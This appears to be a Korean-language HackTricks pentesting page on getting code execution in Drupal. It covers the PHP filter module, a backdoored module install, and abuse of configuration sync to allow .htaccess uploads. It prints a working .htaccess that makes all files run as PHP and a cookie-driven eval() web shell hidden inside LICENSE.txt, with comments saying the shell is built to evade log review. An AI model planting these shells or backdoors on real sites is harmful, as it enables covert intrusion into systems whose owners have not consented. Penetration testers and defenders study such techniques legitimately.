# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## PHP 필터 모듈 사용

> [!WARNING]
> 이전 버전의 Drupal **(버전 8 이전)**에서는 관리자로 로그인하고 **`PHP filter` 모듈을 활성화**할 수 있었습니다. 이 모듈은 "내장된 PHP 코드/스니펫을 평가할 수 있게 해줍니다." 그러나 버전 8부터는 이 모듈이 기본적으로 설치되지 않습니다.

1. **/modules/php**로 가서 403 오류가 반환되면 **PHP 필터 플러그인이 설치되어 있으며 계속 진행할 수 있습니다.**
1. 그렇지 않으면 `Modules`로 가서 `PHP Filter`의 체크박스를 선택한 다음 `Save configuration`을 클릭합니다.
2. 그런 다음 이를 악용하기 위해 `Add content`를 클릭하고 `Basic Page` 또는 `Article`을 선택한 후 **PHP 백도어**를 작성합니다. 그런 다음 텍스트 형식에서 `PHP` 코드를 선택하고 마지막으로 `Preview`를 선택합니다.
3. 이를 트리거하려면 새로 생성된 노드에 접근하기만 하면 됩니다:
```bash
curl http://drupal.local/node/3
```
## PHP 필터 모듈 설치

> [!WARNING]
> 현재 버전에서는 기본 설치 후 웹에만 접근하여 플러그인을 설치하는 것이 더 이상 불가능합니다.

버전 **8부터는** [**PHP 필터**](https://www.drupal.org/project/php/releases/8.x-1.1) **모듈이 기본적으로 설치되지 않습니다**. 이 기능을 활용하기 위해서는 **모듈을 직접 설치해야 합니다**.

1. Drupal 웹사이트에서 모듈의 최신 버전을 다운로드합니다.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. 다운로드가 완료되면 **`관리`** > **`보고서`** > **`사용 가능한 업데이트`**로 이동합니다.
3. **`찾아보기`**를 클릭하고, 다운로드한 디렉토리에서 파일을 선택한 후 **`설치`**를 클릭합니다.
4. 모듈이 설치되면 **`콘텐츠`**를 클릭하고 **새 기본 페이지를 생성**합니다. 이는 Drupal 7 예제에서 했던 방식과 유사합니다. 다시 한 번, **`텍스트 형식` 드롭다운에서 `PHP 코드`를 선택**하는 것을 잊지 마세요.

## 백도어가 있는 모듈

> [!WARNING]
> 현재 버전에서는 기본 설치 후 웹에만 접근하여 플러그인을 설치하는 것이 더 이상 불가능합니다.

**모듈을 다운로드**하고 **백도어**를 추가한 후 **설치**하는 것이 가능했습니다. 예를 들어, 압축 형식으로 [**Trurnstile**](https://www.drupal.org/project/turnstile) 모듈을 다운로드하고, 그 안에 새로운 PHP 백도어 파일을 생성하여 `.htaccess` 파일을 통해 PHP 파일에 접근할 수 있도록 했습니다:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
그리고 **`http://drupal.local/admin/modules/install`**로 가서 백도어가 설치된 모듈을 설치하고 **`/modules/turnstile/back.php`**에 접근하여 실행합니다.

## 구성 동기화를 통한 Drupal 백도어 <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**게시물 공유자** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### 1부 (_미디어_ 및 _미디어 라이브러리_ 활성화)

_확장_ 메뉴 (/admin/modules)에서 이미 설치된 것으로 보이는 플러그인을 활성화할 수 있습니다. 기본적으로 플러그인 _미디어_ 및 _미디어 라이브러리_는 활성화되지 않은 상태이므로 활성화하겠습니다.

활성화 전:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

활성화 후:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 2부 (_구성 동기화_ 기능 활용) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

우리는 _구성 동기화_ 기능을 활용하여 Drupal 구성 항목을 덤프(내보내기)하고 업로드(가져오기)할 것입니다:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**system.file.yml 패치**

먼저 `allow_insecure_uploads`의 첫 번째 항목을 패치하는 것으로 시작하겠습니다:

파일: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

다음으로:

파일: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**패치 field.field.media.document.field_media_document.yml**

그런 다음, 두 번째 항목 `file_extensions`를 다음에서 패치합니다:

File: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

다음으로:

파일: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> 이 블로그 포스트에서는 사용하지 않지만, `file_directory` 항목을 임의로 정의할 수 있으며, 경로 탐색 공격에 취약하다는 점이 주목됩니다 (따라서 Drupal 파일 시스템 트리 내에서 위로 올라갈 수 있습니다).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 3 (기능 _문서 추가_ 활용) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

마지막 단계는 가장 간단하며 두 개의 하위 단계로 나뉩니다. 첫 번째는 .htaccess 형식의 파일을 업로드하여 Apache 지시어를 활용하고 .txt 파일이 PHP 엔진에 의해 해석되도록 허용하는 것입니다. 두 번째는 우리의 페이로드를 포함하는 .txt 파일을 업로드하는 것입니다.

File: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
왜 이 트릭이 멋진가요?

웹 셸(우리가 LICENSE.txt라고 부를 것)이 웹 서버에 배포되면, `$_COOKIE`를 통해 명령을 전송할 수 있으며, 웹 서버 로그에는 텍스트 파일에 대한 정당한 GET 요청으로 표시됩니다.

왜 웹 셸의 이름을 LICENSE.txt로 정했나요?

단순히 Drupal 코어에 이미 존재하는 다음 파일, 예를 들어 [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)를 사용하면, 339줄과 17.6 KB 크기의 파일이 있어 중간에 작은 PHP 코드 조각을 추가하기에 완벽합니다(파일이 충분히 크기 때문에).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

파일: 패치된 LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Part 3.1 (파일 .htaccess 업로드)**

먼저, _Add Document_ (/media/add/document) 기능을 활용하여 Apache 지시어가 포함된 파일(.htaccess)을 업로드합니다.

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Part 3.2 (파일 LICENSE.txt 업로드)**

그 다음, _Add Document_ (/media/add/document) 기능을 다시 활용하여 라이선스 파일에 숨겨진 Webshell을 업로드합니다.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Part 4 (Webshell과의 상호작용) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

마지막 부분은 Webshell과 상호작용하는 것으로 구성됩니다.

다음 스크린샷에서 볼 수 있듯이, Webshell에서 기대하는 쿠키가 정의되지 않으면 웹 브라우저를 통해 파일을 조회할 때 다음과 같은 결과를 얻습니다.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

공격자가 쿠키를 설정하면 Webshell과 상호작용하고 원하는 명령을 실행할 수 있습니다.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

로그에서 볼 수 있듯이, 요청된 것은 txt 파일뿐인 것 같습니다.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

이 기사를 읽어 주셔서 감사합니다. 도움이 되길 바랍니다. 

{{#include ../../../banners/hacktricks-training.md}}
